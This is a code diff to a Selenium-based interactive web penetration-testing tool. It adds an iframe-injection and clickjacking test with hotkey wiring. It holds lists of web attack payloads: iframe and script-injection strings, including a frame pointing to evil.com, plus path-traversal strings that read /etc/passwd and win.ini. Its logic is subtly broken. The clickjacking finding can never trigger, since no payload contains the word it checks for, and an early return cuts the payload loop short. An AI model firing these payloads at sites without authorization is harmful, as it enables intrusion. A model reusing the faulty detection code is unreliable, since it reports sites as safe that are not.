@@ -62,6 +62,7 @@ class InteractivePentester:
         self.sql_payloads = self.load_wordlist('sqli.txt')
         self.xss_payloads = self.load_wordlist('xss.txt')
         self.lfi_payloads = self.load_wordlist('lfi.txt')
+        self.iframe_payloads = self.load_wordlist('iframe.txt')
 
         # Keyboard state
         self.ctrl_pressed = False
@@ -105,6 +106,15 @@ class InteractivePentester:
             return [
                 "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                 "....//....//....//etc/passwd"
+            ]
+        elif 'iframe' in filename:
+            return [
+                "<iframe src=\"javascript:alert(1)\"></iframe>",
+                "<iframe src=\"https://evil.com\"></iframe>",
+                "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+                "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
+                "<iframe src=\"x\" onload=\"alert(1)\"></iframe>",
+                "<iframe src=\"https://victim.com\" style=\"opacity:0\"></iframe>"
             ]
 
         return []
@@ -464,6 +474,132 @@ class InteractivePentester:
             self.show_notification("✓ No LFI detected", "success")
             print("[+] No LFI found")
 
+    def test_iframe_injection(self, element):
+        """Test Iframe Injection and Clickjacking"""
+        print("\n[*] Testing Iframe Injection...")
+        self.show_notification("🔍 Testing Iframe Injection...", "testing")
+
+        test_results = []
+
+        for payload in self.iframe_payloads:
+            try:
+                element.clear()
+                element.send_keys(payload)
+                time.sleep(0.5)
+
+                try:
+                    element.send_keys(Keys.RETURN)
+                    time.sleep(1)
+                except:
+                    pass
+
+                # Check for iframe injection indicators
+                page_source = self.driver.page_source.lower()
+                iframe_indicators = [
+                    '<iframe', 'srcdoc=', 'javascript:',
+                    'data:text/html', 'onload=', 'onerror='
+                ]
+
+                # Check if payload is reflected unescaped
+                iframe_found = False
+                if payload.lower() in page_source:
+                    soup = BeautifulSoup(self.driver.page_source, 'html.parser')
+
+                    # Check for iframe tags
+                    iframes = soup.find_all('iframe')
+                    for iframe in iframes:
+                        if any(indicator in str(iframe).lower() for indicator in ['javascript:', 'data:text/html', 'srcdoc=']):
+                            iframe_found = True
+                            break
+
+                    # Check for embedded iframes in attributes
+                    for tag in soup.find_all():
+                        for attr, value in tag.attrs.items():
+                            if value and payload in str(value):
+                                iframe_found = True
+                                break
+
+                # Check for clickjacking protection
+                x_frame_options = None
+                csp_frame_ancestors = None
+                try:
+                    # Make a request to check headers
+                    current_url = self.driver.current_url
+                    script = """
+                    return (async () => {
+                        const response = await fetch(window.location.href);
+                        return {
+                            'x-frame-options': response.headers.get('x-frame-options'),
+                            'content-security-policy': response.headers.get('content-security-policy')
+                        };
+                    })();
+                    """
+                    headers = self.driver.execute_script(script)
+                    if headers:
+                        x_frame_options = headers.get('x-frame-options')
+                        csp = headers.get('content-security-policy')
+                        if csp and 'frame-ancestors' in csp.lower():
+                            csp_frame_ancestors = True
+                except:
+                    pass
+
+                # Clickjacking vulnerability if no protection
+                clickjacking_vuln = (x_frame_options is None and csp_frame_ancestors is None)
+
+                if iframe_found:
+                    vuln = {
+                        'type': 'iframe_injection',
+                        'severity': 'high',
+                        'payload': payload,
+                        'url': self.driver.current_url,
+                        'element': element.get_attribute('name') or element.get_attribute('id') or 'unknown',
+                        'timestamp': datetime.now().isoformat()
+                    }
+                    self.results['vulnerabilities'].append(vuln)
+                    self.show_notification("⚠️ Iframe Injection vulnerability detected!", "vulnerability")
+                    print(f"[!] Iframe Injection found with payload: {payload}")
+                    break
+
+                if clickjacking_vuln and 'clickjacking' in payload.lower():
+                    vuln = {
+                        'type': 'clickjacking',
+                        'severity': 'medium',
+                        'payload': payload,
+                        'url': self.driver.current_url,
+                        'details': 'No X-Frame-Options or CSP frame-ancestors header found',
+                        'timestamp': datetime.now().isoformat()
+                    }
+                    self.results['vulnerabilities'].append(vuln)
+                    self.show_notification("⚠️ Clickjacking vulnerability detected!", "vulnerability")
+                    print(f"[!] Clickjacking vulnerability - No frame protection headers")
+
+                test_results.append({
+                    'payload': payload,
+                    'iframe_found': iframe_found,
+                    'clickjacking_vulnerable': clickjacking_vuln,
+                    'x_frame_options': x_frame_options,
+                    'url': self.driver.current_url
+                })
+
+                if self.driver.current_url != self.target:
+                    self.driver.back()
+                    time.sleep(1)
+                    return
+
+            except Exception as e:
+                print(f"[-] Error testing payload {payload}: {e}")
+
+        self.results['tests_performed'].append({
+            'type': 'iframe_injection',
+            'element': element.get_attribute('name') or element.get_attribute('id'),
+            'results': test_results,
+            'timestamp': datetime.now().isoformat()
+        })
+
+        if not any(r['iframe_found'] for r in test_results):
+            self.show_notification("✓ No Iframe Injection detected", "success")
+            print("[+] No Iframe Injection found")
+
     def execute_console_test(self, script):
         """Execute JavaScript test in console"""
         print(f"\n[*] Executing console test...")
@@ -512,6 +648,11 @@ class InteractivePentester:
                     elif key.char == 'l':
                         self.testing_in_progress = True
                         threading.Thread(target=self.handle_lfi_test).start()
+
+                    # Ctrl + F = Iframe Injection
+                    elif key.char == 'f':
+                        self.testing_in_progress = True
+                        threading.Thread(target=self.handle_iframe_test).start()
 
                     # Ctrl + C = Console test
                     elif key.char == 'c' and self.console_mode:
@@ -565,6 +706,17 @@ class InteractivePentester:
         finally:
             self.testing_in_progress = False
 
+    def handle_iframe_test(self):
+        """Handle Iframe Injection test"""
+        try:
+            element = self.driver.switch_to.active_element
+            if element and element.tag_name in ['input', 'textarea']:
+                self.test_iframe_injection(element)
+        except Exception as e:
+            print(f"[!] Error: {e}")
+        finally:
+            self.testing_in_progress = False
+
     def handle_console_test(self):
         """Handle console test"""
         try:
@@ -610,6 +762,7 @@ class InteractivePentester:
 ║  Ctrl + I  →  SQL Injection Test                          ║
 ║  Ctrl + X  →  XSS Test                                     ║
 ║  Ctrl + L  →  LFI Test                                     ║
+║  Ctrl + F  →  Iframe Injection & Clickjacking Test        ║
 ║  Ctrl + C  →  Console JavaScript Test                     ║
 ║  Ctrl + Q  →  Quit                                         ║
 ╠════════════════════════════════════════════════════════════╣
@@ -644,7 +797,7 @@ class InteractivePentester:
 
         # Show help
         self.show_help()
-        self.show_notification("Interactive Pentest Mode Active! Press Ctrl+I/X/L to test", "info")
+        self.show_notification("Interactive Pentest Mode Active! Press Ctrl+I/X/L/F to test", "info")
 
         print("\n[*] Interactive mode active - Use hotkeys to test")
         print("[*] Press Ctrl+Q to quit")
